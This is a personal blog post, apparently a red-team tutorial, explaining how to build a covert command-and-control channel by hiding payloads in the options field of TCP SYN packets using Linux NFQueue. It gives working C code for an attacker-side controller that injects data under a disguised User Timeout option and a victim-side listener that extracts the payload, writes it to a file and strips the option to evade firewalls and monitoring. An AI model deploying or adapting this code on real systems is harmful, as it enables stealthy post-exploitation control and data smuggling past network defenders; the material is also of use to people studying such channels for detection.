---
title: Command and Control via TCP Handshake
date: 2019-09-15 02:14:35
tags: 
 - Linux
 - C2
 - TCP
 - NFQueue
 - Netfilter
---


## Quick Intro/Disclaimer
This is my first blog post, so please let me know if there's any way I can improve this post. I expect it to have inaccuracies and maybe have parts that can be explained better. Would appreciate a quick note if any of you notice them! So, all that BS aside, let's get into it.

 
Quick disclaimer: the method presented here probably doesn't have as much use or application in a real red teaming scenario. The main reason: you need to have root on the victim machine at some point for it to even work, although after having it one time you can configure the victim system so it is not necessary again. I wrote this as primarily because I though it was a cool and creative way to exfiltrate or infiltrate data with hilarious stealth.
 
## Background

Command and control is pretty widely known across the security world. You set up a listener on a victim machine and send commands to it that it then executes, hopefully with root. People have a lot of creative ways to hide the commands that are sent: Cobalt Strike uses timed delays with its beacons, Wireguard can be used to encrypt data while being transferred, etc. However, the problem with all these approaches is that anyone (or anything) that's monitoring data transfer at the right time and place has the potential to catch these threats. However, who the hell looks so closely at SYN packets? 

<br/>
<br/>

# Initial Info

If you know the structure of an IPV4 or TCP packet or are OK with checking back to see what part of the packet I'm talking about, skip ahead. 

#### IPV4 packets are structured as shown in this image

!["IPV4 Packet Structure"](https://thirdinternet.com/wp-content/uploads/2017/10/ipv4_packet_header.jpg)

#### TCP packets are structured as shown in this image.

!["TCP Packet Structure"](https://lh3.googleusercontent.com/ApoQ91eGRud1HP-l80tXfzLOrOC-Ie0HDh_2CZ9TiaSuaBP5odLaxv9kHs-pSYymEv511kjbmxDYl4e2nF8kkfQQGPE9H_At39dG9Si0d01b1FX4acWFlIN9nbT7Ao8_m_wQPSD8AWELSwBWXW5uVXtzzWCm0HykAIIPUBKxA4dNg_WrmPPX59iMTfpRqzzxwTSY_H89lSmimADuEGYkYVVFcDvMxIMYPWKIv-1QXX96-kLOFyfJkhePZ2KRJncaAfGk3heV-Rcw5ljEc622r3DrSJRBm2El83KcyEbVXAr0do6aPsX9MOUxUAI5iZJtOBlyf5n7BNq3QRqmVm_QFC52avOz3IZ8CXJWHBK7KNZ2JLhthu0bgM4vwlDPKMemow1P3ALqbR9klKvJt5O3G9AK8pRLqUmxsvWZ51BgZwx7enQPc0kwqfgo5PI_QpXC1jK08QUHvYRK-NMWVCV1t0A7GkwI7ksa_Zafm3AsvHczAloL8gw_ck8bdcx4MA9lvdgdqIS8LKIaUrmFOQPM613X9CR9l5mklXKNSrDjzPAC-0ylnoowUpbGabJg2ES21AdNsB1KuriBk55B5k_TSRkmbtCbo4iSazN56OT_iZn3r1nvzB62QdixXVIbVIA_CAjrI0ru6HY6atxAAA6IpfEYTM4_Uuc_vK6cY4rQl95qwbqJEV-n5WJkZCjkeZyrgKd5dSAZwzdF-3iUtvoWzHNom82FjnBFj8EbqVCWzsAgT90=w768-h431-no)

<br/>
<br/>

Not much space to hide any data. That makes perfect sense because handshake packets are meant to establish a connection and define parameters for it, not send data themselves. Much of the packet is pre-defined or will cause problems with the connection if changed, like port, flags, etc. The sequence number can encode 4 bytes of data at a time to infiltrate data, but this isn't good enough. 4 bytes per second might be acceptable for RCE to a server on the Moon in 1969 but we need something that can at least carry the equivalent of a full sentence in English. Meet: the options field.

TCP Options are absolutely vital in modern day connections. They are what define how data will be transferred from one endpoint to the other. The entire size of a TCP handshake must be at maximum 60 bytes. Thus, there's a whopping 40 bytes of space available in TCP options. Ten times more than what we just saw! We will actually able to go beyond this in the test environment and the packet will still be accepted. Through research online, I found that the 40 bytes limit is for packets that need to be legit. In practice, an extra long TCP options portion will only be truncated if the packet is re-segmented when it goes through one of its hops. The firewall will (I assume) need to have this 20 byte limit hardcoded and ignore the total length portion of the IPV4 header to truncate all the values.


However, for the purpose of this experiment we are gonna assume that doesn't happen and the packet is sent through as it is. In order to add options to the TCP packet, we need to update the "Data Offset" portion which lists the number of 32 bit words in the packet. The TCP packet is 5 words (20 bytes / 32 bits or 4 bytes = 5) and the Data Offset portion is 2 bits, leaving us 251 words to work with: a THICC 1KB of data that could go in the options. More than enough for a couple of commands.

In addition, although we won't mess with this in the experimental setup, there is an experimental option that IANA has acknowledged that lets you extend the Data Offset portion by even more. Here's a [link](https://tools.ietf.org/html/draft-ietf-tcpm-tcp-edo-10#page-5) for those that want to read more into it.

## NFQueue

Netfilter created a plugin called NFQueue for IPtables to bridge the gap between intercepting packets on the kernel and being able to modify and read them from your own program from userspace. It relies on the `libnetfilter_queue` library and (initially) root access which sucks, but it won't stop us. For now, everything will be done through root, but for future work any user with CAP_NET_ADMIN capabilities on the victim can perform this attack as well.

Back to the topic at hand, NFQueue copies packets from kernel space to userspace for anyone with privileges to mess with them then give a verdict. This verdict could be your everyday ACCEPT, REJECT, DROP, or one of the special NF_REPEAT or NF_QUEUE which either reinserts the modified packet back into the queue or sends it to a different NFQueue listener. 

Enough talk. Time to code.

# Building the test environment

The test environment I setup is two Ubuntu 18.04 LTS server VMs each with `libnetfilter-queue-dev` dependencies installed where I refer to one as the `listener`, the victim machine, and the `controller`, the attacking machine.

# Writing the code


I will be going over how the code actually works. If you just wanna see Wireshark pictures and the result, skip ahead to the screenshots.

## Some stupid college kid boiled some plates

NFQueue needs a big chunk of boilerplate code to get started. Noone wants to write all that code themselves, so neither will we. The boilerplate I have made for us is a heavily modified version of the Hello World found [here](https://github.com/irontec/netfilter-nfqueue-samples/blob/master/sample-helloworld.c).


Initial commit for the controller can be found [here](https://gitlab.com/thesw4rm/nfqueue_c2/commit/b7c8741546498b2fc9e3a5b729f2ca8f75da3fa7)

Initial commit for the listener can be found [here](https://gitlab.com/thesw4rm/nfqueue_c2/commit/af50b3297bf2c043a1edc69f5bdd87cfa0885e33)



## Breaking down the boilerplate
Lots of code here, let's go over it real quick. 
***

#### `tcp_pkt_struct.h`

```c
#pragma pack(push, 1)
typedef struct {
    struct iphdr ipv4_header;
    struct tcphdr tcp_header;
} full_tcp_pkt_t;
#pragma pack(pop)

```
This is what we will use to modify packet headers. NFqueue just gives us a void array of bytes, it's up to us to figure out what to do with. Notice `struct iphdr` and `struct tcphdr` are directly from the Linux networking library.

#### `main.c`

We will treat three functions as a black box (we know what they do but not how they do it). Mostly because I found them on Google and actually have no idea how they work.
```c
long ipcsum(unsigned char *buf, int length);
void tcpsum(struct iphdr *pIph, unsigned short *ipPayload);
void rev( void *start, int size);
```

`ipcsum` and `tcpsum` calculate the checksum of an IPV4 and TCP packet. `rev` reverses the bytes starting at the passed in pointer for `size` number of bytes. so `01 02 03` will become `03 02 01`. We will use this to fight the battle against different endians for network byte order and Linux byte order.

Now let's look at the non-blackbox functions.

```c
int main();
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, ...);
static void modify_handshk_pkt(full_tcp_pkt_t *pkt, int pkt_len);
```

The main functions loads packets from the `sk_buff` and writes them into a statically allocated 4098 byte buffer. 4098 is overkill for SYN packets. Change it if you want. You don't have to for experimental purposes.

The `cb` is the callback that handles each packet as it enters `sk_buff` and `modify_handshk_pkt` will modify or read the packet as needed.

***
## Plan of attack

Let's take a look at a SYN packet in Wireshark to see what we are working with. I ran a simple web server on port 8000 on the `listener` 

```bash
python3 -m http.server &
```

***
##### Curl the server from the controller

![](https://lh3.googleusercontent.com/8x-q-9zQtnkNlRhlKgRUCDw5dFFEV7p4vs04eijkdvRriYzkS15rSiZJhLBJr06o5hzMvmW3j2s6onbKEzZWbOC8wYWOwv71g1Wivppxs7vR2FT2ofgmUXXccZUs9f8nSxnzhNkpza-9DKVeRESjA3XRpnGnnikQZqKgtce2qufJ5ss179z5hz3S9kQA1Ke_oi3-n4EDM-GpGUo6T9BG7nepmMOgQ6nr64eftob0cN-8gx6LHZz3pgl7LFpfw77lywh4YE-c0J_yBxevnQC-MZvXckrVqR0x-_53uUS4Rukj1Dh214ZR3iBb_Auy5lyfcg_IbLVKdWtx3qAGvNTeO-yXchhU4yn8GUL25uB2qyYU9DVF57EqD1aYbXhEY5gal6ZOqE9yMoIM9zXi_S4a5P8k5yrhe2mOrHUy_RJ8DmNQgb6UM6Dz435tGeBdZzMErv7H1RvSCQge-n-g2c1yUQmzB8838n4dZ6rr6IL4UcjKawkr7jP1mrrttYabtXg7QlPPAXtc5RscFD3XUoFLukC8qUyIvVAtiFK7R2A-G3MYPxWparIbGAFb0Makzzo6decbt4YsVog1RQh6QmmZ9SqsCZrNm72VX_ydm5xtVywEG-aUbThslSca5HWh69zk-0UeMjCG83KYSup5VQwyGbZGUWUUX8OnTAbzZJVI1uIy3ngJyvdANw=w726-h399-no)

##### Let's look at what wireshark shows (filtered for just SYN packets)

![](https://lh3.googleusercontent.com/2d8aa20a44kd_ubjF1VpyB_0mv6JS9FXm0jfCe-5qUZSOaKpTXIpYkV_aDA-gaYvy3kuYVWFcGvi_5RuYLzmLKPQ11oC7wDhEQci7FVg_6HBPBZs852NenUzQEN0leWZ6ah2VclWziZqOHPios-jbpcZhqpP-0euy7msVHLdjDENsXR-sAKGnr0kXOtuir85MSxXeBdlEs73waRC69wOuKsHae5M71NyfEskJEYPWdyc9F0XpTluel4cl87tRjwngxBZq41tUUZWozWksx4_bdoBZJXfNhXImiPFlxBIQa_mbQZ1UEVOpLfLN7JP_gPO3bZbRhy_wRdcmQ_KnZccq26JQ59EFlFAe5Q90T_6vBvIR6rI5Yc5h5LtkBCnt99-fKw1VQlDRmum14Xdlv23kBtklAzoidmbM4naImy9vt9W2soKwz7NdPuSNUa9Pp21CDqQTL0AER5gylSoOmULrVGNrcOmG8cHkkgsNbrGYAVHBfoGHcQZf1acwIQMeioE6m63JUBhgBAWcIx6GWOIrg6qN7M7E9jLOIabBtQ-TitWyzxsObn6yeev_d-a3tVU-IRp6b_9l3_D0EXiiSxN--_qgcJj5fJdCi-DbxleEy5-WrgFrt8W8WlkaG3wfa7WRYB2zXiobVJ_FwDxHdkfEUpcSsh16UmiM-P-t9QeOAswT4EFrSSTdxHPpYVuasNjvXtYKKbvDH2_OlaBBmQM6uWMntQx4FnAAz6eLvXIBu2om6g=w399-h287-no)
***

#### Analysis
<br/>
The portion that is highlighted in white, `02 04 05 b4` is where the TCP options start. TCP options are placed one after another in the format "Option-Kind: 1 byte - Option-Length: 1 byte - Option-value: value of length - 2 bytes". The option length defines the length for ALL bytes in the option, including the byte used for the kind and length itself. In this case, `02` represents the Maximum Segment Size, has a length of `04`, and a value of `05b4`.

Notice `Header Length: 40 bytes` further up in Wireshark's description of the packet. This is a converted form of the `Data Offset` field.

So in order to add options at the end, we will need to update the Total Length in the IPV4 packet (look back if you don't remember) and the `Data Offset` with as many 4 bit words as are in our options. This also means that the total length of everything we add to the packet has to be a multiple of 4 (you can't have a fractional `Data Offset`). We can pad the packet with `01` or No-OP for this purpose. 
***
## The Storm of Code - `Controller`

The legit way to add extra data to the TCP packet would be to use an experimental option. However, we want to hide, so let's use an option that will be very common, like User Timeout (0x1c or 28). IANA has a list of option assignments on their page. 

So let's add to the code. 
***
#### `tcp_pkt_struct.h`
Insert code at the top
```c
#define METADATA_SIZE 16

#pragma pack(push, 1)
typedef struct {
    uint16_t padding;
    uint8_t opt;
    uint8_t len;
    uint32_t payload;
    uint32_t payload_2;
    uint32_t payload_3;

} pkt_meta;

#pragma pack(pop)

...

```

The option has a kind, a length, and a payload which is a string we will write to a file on the victim. The padding at the beginning is to keep the total length divisible by 4. Because the data will directly be appended to the packet, we cannot use an array and need to split the payload into chunks of 4 bytes.
***
#### `main.c`
```c
static void modify_handshk_pkt(full_tcp_pkt_t *pkt, int pkt_len) {

    /* Should match only SYN packets */
    printf("\nPacket intercepted: \n");
    if (pkt->tcp_header.syn == 1 && pkt->tcp_header.ack == 0) {
        printf("\tPacket type: SYN\n");
        pkt_meta *metadata = (pkt_meta *)((unsigned char *)pkt + pkt_len);
    	metadata->padding = 0x0101;
    	metadata->opt = 0x1c; // Custom option kind. 28 = User Timeout
    	metadata->len = METADATA_SIZE - sizeof(metadata->padding); // Custom option length. Default length of User timeout is different.
        pkt->tcp_header.doff += METADATA_SIZE / 4; // Change data offset
        
        }




}

```

We added in all the code relevant to the TCP packet. At the end, we change the data offset to reflect the additional options. Let's move onto the callback where the packet is finally sent on its way. 

***

```c
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data) {
    u_int32_t id;

    struct nfqnl_msg_packet_hdr *ph;
    ph = nfq_get_msg_packet_hdr(nfa);
    id = ntohl(ph->packet_id);
    printf("entering callback\n");

    full_tcp_pkt_t *ipv4_payload = NULL;
    int pkt_len = nfq_get_payload(nfa, (unsigned char **) &ipv4_payload);
    modify_handshk_pkt(ipv4_payload, pkt_len);

    rev(&ipv4_payload->ipv4_header.tot_len, 2);
    ipv4_payload->ipv4_header.tot_len += METADATA_SIZE;
    rev(&ipv4_payload->ipv4_header.tot_len, 2);

	ipv4_payload->ipv4_header.check = 0;
    ipv4_payload->ipv4_header.check =
        ipcsum((unsigned char *)&ipv4_payload->ipv4_header,
                20);
    rev(&ipv4_payload->ipv4_header.check, 2); // Convert between endians

    tcpcsum(&ipv4_payload->ipv4_header,
          (unsigned short *)&ipv4_payload->tcp_header);
    int ret = nfq_set_verdict(qh, id, NF_ACCEPT, (u_int32_t) pkt_len + METADATA_SIZE,
            (void *) ipv4_payload);
    printf("\n Set verdict status: %s\n", strerror(errno));
    return ret;
}

```

We extend the total length of the IPv4 packet so the TCP packet doesn't get truncated on its way to the destination. The Linux system I was using got confused between it's preferred Little Endian and the network packet's Big Endian, so I had to reverse the bytes first, add the length, and reverse the bytes again. This may not be the case for you guys. You can confirm it by seeing if the total length increases by `0x0010` bytes or by `0x1000` bytes. We then recalculate the IP and TCP checksum while reversing the bits as necessary. (Normally packets don't need a valid TCP checksum but let's put it there anyways).
***

### Fruit of labour

***

Let's see the result of our work. Make a build folder and build the entire project using CMake. Then upload to the `controller`. There's an IPtables rule in `iptables_rules.sh` that intercepts SYN packets on port 8000 and sends them to queue 0. If nothing is listening on queue 0 then it simply sends the SYN on its way. 

Steps

1) Create build folder and build project
2) Upload build folder and `iptables_rules.sh` file to `controller`. 
3) Run `iptables_rules.sh` as root on `controller` (only if the system was restarted or this is the first upload)
4) Run `main` in the build folder as root on `controller`
5) Start up Wireshark on `listener` filtering on packets on port 8000 to view the result (to make sure it was received)
6) Send HTTP request from `controller` to `listener` on port 8000

#### `Controller Screenshot`
![](https://lh3.googleusercontent.com/ozlxRmfURS-_pg3KliUPv3ClXyekX3yQsMeQhjPtwSIcaRnbzP6aB-TUbYW8jVoLd44-LLnPu2N8i5uA6JhMy6NGwInnhI2L7Kbz-HJh_aTLOyhQipkyL1DwKr04KopIwDrHGvqPQvwfdFekYhZ5LhIXumYev7PQUitfKIB9YztAbo3xadGPBUWl_THmXjNNlGslkcLYIcMPzBtAMoY1SLSiFB2fWrD3NfKgI5ATrUBgY83dNnRH0kPgwUE8yPIUxcb3fcqNPKZtuOvDc7x77LWWTcILpakBoVwRW-_96MI-OVn5byGkwOGSh2u21wgYB0_KiDKh8y0FsMXZSTqHdo_wSYtP2lNUfXPHDKHrtoA8MfP4jFeSKw8i6QgwYAWFhY34nUMeaYyue0_AtFfDU2pOdh7a6NbjtxTyMndy7Pkx1dimZaeUUTzRVndndSikNiemgzxD-aUfUGJ-cZ5IcWZyUyYDkrVL9ycy0PZw9O2vFTP5N4t4N35GslQhFP7pLvOrhEmz9oM4tb8NEIekfRvO1hHd4jqMRl6i_U_zQp4zEsTbTM5rtvp3qY60ove80xQmPRWj2WcUVPc-22YoRDjOgBx2QM5uf5UxX4h3v702TqxEgNP42QSU5B_alKn7T4WjSIvxfIDXTMCYDIyrCGpoZSwy-Jj_WvaUy4w1Om5-ULFhpXl91KBoD6uOhPfFRHmReTo6-4-d21PR5wNEeWtScVi5w5w0BI2EPb-lkVxE_xE=w1184-h568-no)

#### `Controller Wireshark`

![](https://lh3.googleusercontent.com/C9INH6puYSdZBvs9NCInsBbsCR54BqG7gBYBVYZOolno7LSSe8nQGu-Gjdj_-hi9LZi8ddiaBmhG2efRTI_D4NOtHOpaCuFy2_vVOjHgcnukSURS8PmQgWj4wn-QZLqe7O93785LThI0J107jgYwLxln728YFA7OpcbWCZXj378ElFYKWUWDt1zB_EhitebTYILgYpLNH2UNSidNgzErehGddpyCTgnRtRYbRmjJZfWErTWNRT7yaGaXEU0Ct96Dr-EmFg1qB9iUREiQ2At_3PyUcWHXsE7b_JwgXsC-7OCn6TPR1VZrjPLlqDlTYJgkP6B8AOciUtZhEyhCc25BG-XTAJW-Bf_FxG5z0Up1oy8n_903mJnq3w6lS-S37qHEN99JWyeC0Z4JQk9xieaJV-Wcphlmtm-MPBH9EfqbRVh_J6oQ6sdTnNYnNSv8SiA3wWUmjZEM9IPxxNa0lAnCHsam584tEfTIWwfqJJXCtToW7u-BYVwA1icybvdxI-m8yw3kAzYaxkR4d48wojqw7Xt4-z3IKMQUy0RgnfDFQ6-wPecdH_WujZYW13nGuhjGAH0OIJjmX-ILIgBz7XWOH7gPurwn7rkIAIjujua7sh3OKUrS7GsLMwy8l0EDCRyVLLF66OhO6SrbBa7LjWvw0aQoy8sfldgIs5LWnq7znUlX9X-ldgGmETNT81C_TUZ1awrmjkNorrbIinczc8g6zweYPn-o9RKDCOHEe8JyCPdS6hY=w808-h301-no)

Awesome! The SYN packet in that whole HTTP request has our data added to the end. No kernel programming necessary. Notice that the User timeout is supposed to be 4 bytes and we set it to 14. If you want to be extra stealthy you can use multiple options and break your payload into their individual default lengths so there isn't an anomaly. For this experiment, we don't care. :P


## The Storm of Code- `listener`

Cool we modified a packet from the `controller`. Big whoop. But now we have to do something with that payload.

The code in the listener is the exact same for the boilerplate and `tcp_pkt_struct.h` so refer back if you forgot about them. Let's go right into `main.c`.

### `main.c`

```c
int write_to_file(unsigned char *payload, int len){
    int output_fd;
    ssize_t ret_out;

    output_fd = open("virusfile.pup", O_WRONLY | O_CREAT, 0644);
    if(output_fd == -1){
        perror("open virus file");
        return 3;
    }
    ret_out = write(output_fd, payload, len);
    close(output_fd);
    return 0;
}

static void modify_handshk_pkt(full_tcp_pkt_t *pkt, int pkt_len) {

    /* Should match only SYN packets */
    printf("\nPacket intercepted: \n");
    if (pkt->tcp_header.syn == 1 && pkt->tcp_header.ack == 0) {
        printf("\tPacket type: SYN\n");
        pkt_meta *metadata = (pkt_meta *)((unsigned char *)pkt + pkt_len - METADATA_SIZE);
        unsigned char *payload = (unsigned char *)(&metadata->payload);
        write_to_file(payload, METADATA_SIZE - (sizeof(metadata->padding) + sizeof(metadata->opt) + sizeof(metadata->len)));
        printf("RECEIVED PAYLOAD: %s", payload);
        pkt->tcp_header.doff -= METADATA_SIZE / 4;
    }


}

```

We basically do the opposite of what we did in the `controller` when reading the packet. The pointer for the metadata has to be after the original size of the packet, and instead of writing to the metadata we read from it. Then, we write the payload to a file and reduce the `Data Offset` back to the initial value. 

***

```c
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data) {
    u_int32_t id;

    struct nfqnl_msg_packet_hdr *ph;
    ph = nfq_get_msg_packet_hdr(nfa);
    id = ntohl(ph->packet_id);
    printf("entering callback\n");

    full_tcp_pkt_t *ipv4_payload = NULL;
    int pkt_len = nfq_get_payload(nfa, (unsigned char **) &ipv4_payload);
    modify_handshk_pkt(ipv4_payload, pkt_len);
        rev(&ipv4_payload->ipv4_header.tot_len, 2);
    ipv4_payload->ipv4_header.tot_len -= METADATA_SIZE;
    rev(&ipv4_payload->ipv4_header.tot_len, 2);

	ipv4_payload->ipv4_header.check = 0;
    ipv4_payload->ipv4_header.check =
        ipcsum((unsigned char *)&ipv4_payload->ipv4_header,
                20);
    rev(&ipv4_payload->ipv4_header.check, 2); // Convert between endians

    tcpcsum(&ipv4_payload->ipv4_header,
          (unsigned short *)&ipv4_payload->tcp_header);

    int ret = nfq_set_verdict(qh, id, NF_ACCEPT, (u_int32_t) pkt_len - METADATA_SIZE,
            (void *) ipv4_payload);
    printf("\n Set verdict status: %s\n", strerror(errno));
    return ret;
}

```
Again, just reversing what we did earlier by reducing total length, recalculating checksum, and truncating packet bytes sent out by `libnetfilter_queue` library. 

***
### Proving it worked

Let's look at some screenshots to see that it worked.

Steps to build:

1) Build the project like shown in `controller`
2) Note that `iptables_rules.sh` captures on PREROUTING and not POSTROUTING to intercept packets coming into the system. Upload and run iptables scripts as shown in `controller`.
3) Use `iptables_clean.sh` if you mess up (note that it flushes a ton of rules because I'm lazy) or remove the rule manually and try again. 
4) Run the `server` executable in build directory on the `listener`
***

#### Listener packet interception

![](https://lh3.googleusercontent.com/xXTQxID1VH3XFicvSa-ACl2QBVrpmqk0DsbjV6Gt2N8zJn6QNJE6_yAXc4m83esF_CXXSIBxKcdYAH92cA9-pYz1o7hz2m_jhkwa27FxgXWeCAa3My_qtfDblZAtmxKvU77umg438MglU4NYNcYt37Q2qKm78rGJ5d8H-DlQMySJ6Cun3rF1Zso6zAi_dUVMJjJY1XndUlsr6bSuHGLftDycXaWc8D9gVabT_9OOtoqXtV9k7JhQf3_4puaFytbSey9xQVZ6BZqD_dMLA6-4ACgLWpQYnUudgJCSOsMraSNGgUy5nLvUaE1g7cOCP4C4NacDgz8z3wdxpolUoSzKM7NBQ6buMIST68kMOmWnBiAWAZPvK73AQ_8ed723WX7KzgqAg4CAXa4VHwJNciTCHvV0YpEs8oU2QlhKQBxGJ0Mte-UJdaQkfw8zi8KZMPwcDTRhVE5FFUI7Uf0ORboJ2SsTOlDZSODtylodVUVKXJR9rQII5zrN_6EVN8fxnBLK9hcAVX_Qku5V0xa3F0qhbVu9KgthFRNIF-yLMjWGx3fVlbXsf-wnNlqhOP5q4m7ToKiiHTlpFb0jCjgjttuI2PhNorzZ1zATNT8HCifadSXIcYMUy4UzHnyKDcKhgeb99SjMkGQX8cPPqjgPXV8L7iuVzwqhOGOMwYzLTlu77ISdqYr5e6B1g65rfEcf8SxJGFJ_rjIj2dn_ueXLac1bQBUEsfIze5udk1_GKQs7Xcv2U1s=w1467-h491-no)

Cool! We intercepted the SYN packet coming in, and received the payload. Let's make sure we could write it to a file (you can do anything you want with the payload once you have it).

***

### Listener file contents

![](https://lh3.googleusercontent.com/AxXaAgOUrYIstv7jUcQuTn3giCdNYkRrccn2VsMCnEyRcqBvwpM4W3Hs0AARRUY3ruEgUifa2X6VNS2FEBodTSy59kmORZePxQVbPTQusIyXj1c7Bp5nawmu6YvuCjzwJ58_AGAcw7wErbdzTK-OmIqg0gtvNmLtTrC5i3qZg7fCCWx7rQETQ4Ykh2DO6kqHBk_AaB2M3u4tIDQfhwK0rrIwxkqSVnbKac6EDNgthjzqzDhdOVLsHLRjwCDVyoGS9_1kggBlcwum6bbbKxTcSOSToQdN8hntvZxdA9sNiF6eNDkaThCrHivoLkeh91Exp8-audEhrwARwduk6lhxDHUHANngk3srCPZpN64g_fImLQ7s7g2UTrdiyzE4JYcx39iWRDoWEXV7Oo3KeYWcCUxOcvhxtkhqHlYAgbPiyN-VW8wqEbxenRaWID8DjDbrWQ2mRpv292kpU3UD8JCr3IhOGV9_rmTKkJSh139Xs6hQFKelhAGfkyEfiZXmMmRfqL2l7pej2nMFu54q3Rvoc5z5CQYthEpolKZ5cQk7vkZe55i81x5S9fpavhtQm3ANBqE1Q7BvXqdV8l9b146BE8dVjY2MSeaWW0WFE9boLF7FFJmOHvujaPWRa-lqz4blM6yfnYg84OnJVH0PyAVZrPcr-HPz8RAHLfjXxN45HuU__XTwPs64H5RWdLgK78_FYwGiuE7W1UFUWs78dUfTHEfhsNQSxsw-W1cb6GoKHRyhgu0=w1280-h140-no)

And there you go. Payload was intercepted, packet was truncated (although I couldn't find a screenshot to prove that, you can see for yourself if you run it), and noone is the wiser. The firewall doesn't have the resources to read the options of every single SYN packet coming in, especially when it's a large scale environment with lots of inbounds connections, and the endpoint is none the wiser.

# Conclusions

This is just a Hello World example of what can be done with NFQueue from a red teaming perspective during post-exploitation. The easiest way to hide something in network traffic is to hide in numbers, and we have done just that. There isn't anything more common than an incoming SYN packet to a server.

However, this method does require root privileges on the victim system or `CAP_NET_ADMIN` capabilities for a compromised user. Additionally, the `libnetfilter_queue` dependency must be installed on the victim, meaning that for now this method will only work on systems with netfilter and the NFQueue extension installed (so far I could only find it working on Linux). It can also work on BSD systems using divert sockets but I have not tried that, although as per documentation there are similar limitations as to the Linux method. 


I plan to find a way to hide the payload better within TCP options by researching more into default lengths and commonly used option kinds. Additionally, I'm trying to construct an environment where the TCP packet is re-segmented and possibly truncated if the handshake packet is more than 60 bytes. 

## Future learning

This is my first time making a blog post. Please contact me at thesw4rm@pm.me if you want to discuss anything tech based with me. Definitely please let me know of anything that can be improved, if this method is actually applicable in a real engagement, or anyway I can improve it so it becomes that way. Peace guys!
